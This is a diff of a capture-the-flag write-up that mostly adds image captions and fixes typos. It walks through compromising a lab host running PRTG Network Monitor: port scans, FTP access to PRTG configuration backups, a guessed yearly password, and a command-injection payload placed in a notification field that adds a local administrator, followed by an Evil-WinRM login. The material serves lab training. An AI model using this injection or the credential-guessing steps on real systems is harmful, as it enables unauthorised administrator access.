@@ -38,7 +38,7 @@ Verify if the host is reachable using ICMP:
 ping -c 1 10.10.10.152
 ```
 
-![](screenshots/ping.png)
+![ping](screenshots/ping.png)
 
 The host responds, confirming it is reachable.
 
@@ -58,7 +58,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.152 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![](screenshots/allports.png)
+![allPorts](screenshots/allPorts.png)
 
 Extract the open ports:
 
@@ -66,7 +66,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![](screenshots/extractports.png)
+![extractPorts](screenshots/extractPorts.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -81,13 +81,7 @@ nmap -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 -sC -sV 
 - `-sV`: Detect service versions  
 - `-oN`: Output in human-readable format  
 
-Let's check the result:
-
-```bash
-cat targeted -l java
-```
-
-![](screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 **Findings:**
 
@@ -114,7 +108,7 @@ Navigating through, the **user flag** was retrieved directly from the `Public` d
 ftp 10.10.10.152
 ```
 
-![](screenshots/user_flag.png)
+![user_flag](screenshots/user_flag.png)
 
 ✅ **User flag obtained**
 
@@ -127,7 +121,7 @@ Tried to enumerate SMB shares with CrackMapExec:
 crackmapexec 10.10.10.152
 ```
 
-![](screenshots/crackmapexec.png)
+![crackmapexec](screenshots/crackmapexec.png)
 
 No useful results.
 
@@ -140,16 +134,16 @@ The web server is running **Paessler PRTG Network Monitor**:
 whatweb http://10.10.10.152
 ```
 
-![](screenshots/whatweb.png)
+![whatweb](screenshots/whatweb.png)
 
 - Detected version: **18.1.37.13946**  
 - Default credentials (`prtgadmin:prtgadmin`) failed.  
 
 Let's go to website:
 
-![](screenshots/web.png)****
+![web](screenshots/web.png)
 
-Credentials doesn't work.
+Credentials don't work.
 
 ---
 ## 3. Exploitation
@@ -162,14 +156,14 @@ Returning to FTP, we explored hidden files:
 ls -la
 ```
 
-![](screenshots/hidden_files.png)
+![hidden_files](screenshots/hidden_files.png)
 
 Inside `ProgramData`, configuration files were found:
 
 - `PRTG Configuration.dat`  
 - `PRTG_Configuration.old.bak`  
 
-![](screenshots/program_data.png)
+![program_data](screenshots/program_data.png)
 
 Downloaded both:
 
@@ -178,24 +172,24 @@ get "PRTG Configuration.dat"
 get "PRTG Configuration.old.bak"
 ```
 
-![](screenshots/download_prtg_config.png)
+![download_prtg_config](screenshots/download_prtg_config.png)
 
-Let's compare the two files to check diferences:
+Let's compare the two files to check differences:
 
-``` bash
+```bash
 diff "PRTG Configuration.dat" "PRTG Configuration.old.bak"
 ```
 
 From the backup configuration file, valid credentials were extracted:
 
-![](screenshots/prtg_credentials.png)
+![prtg_credentials](screenshots/prtg_credentials.png)
 
-These credentials doesn't work, buts this machines was created in 2019, so, probably there are company politics that change the password eacah year:
+These credentials don't work, but this machine was created in 2019, so the password likely follows a yearly rotation pattern:
 
 - **Username:** `prtgadmin`  
 - **Password:** `PrTg@dmin2019`
 
-![](screenshots/prtg_web_login.png)
+![prtg_web_login](screenshots/prtg_web_login.png)
 
 Successful login.
 
@@ -214,8 +208,8 @@ test.txt;net user pentest p3nT3st! /add; net localgroup Administrators pentest /
 
 Inside PRTG → `Setup > Notifications`, a new notification was created:
 
-![](screenshots/prtg_notifications.png)  
-![](screenshots/prtg_new_notification.png)
+![prtg_notifications](screenshots/prtg_notifications.png)  
+![prtg_new_notification](screenshots/prtg_new_notification.png)
 
 Before execution, validated that the user `pentest` did not exist:
 
@@ -223,16 +217,16 @@ Before execution, validated that the user `pentest` did not exist:
 crackmapexec smb 10.10.10.152 -u 'pentest' -p 'p3nT3st!'
 ```
 
-![](screenshots/crackmapexec_pentest.png)
+![crackmapexec_pentest](screenshots/crackmapexec_pentest.png)
 
 Ran the notification manually:
 
-![](screenshots/prtg_notification_run.png)  
-![](screenshots/prtg_notification_runned.png)
+![prtg_notification_run](screenshots/prtg_notification_run.png)  
+![prtg_notification_runned](screenshots/prtg_notification_runned.png)
 
 Confirmed user creation:
 
-![](screenshots/crackmapexec_pwn3d.png)
+![crackmapexec_pwn3d](screenshots/crackmapexec_pwn3d.png)
 
 ---
 ## 4. Foothold
@@ -243,7 +237,7 @@ Login via **Evil-WinRM** using the newly created account:
 evil-winrm -i 10.10.10.152 -u 'pentest' -p 'p3nT3st!'
 ```
 
-![](screenshots/root_flag.png)
+![root_flag](screenshots/root_flag.png)
 
 🏁 **Root flag obtained**
 
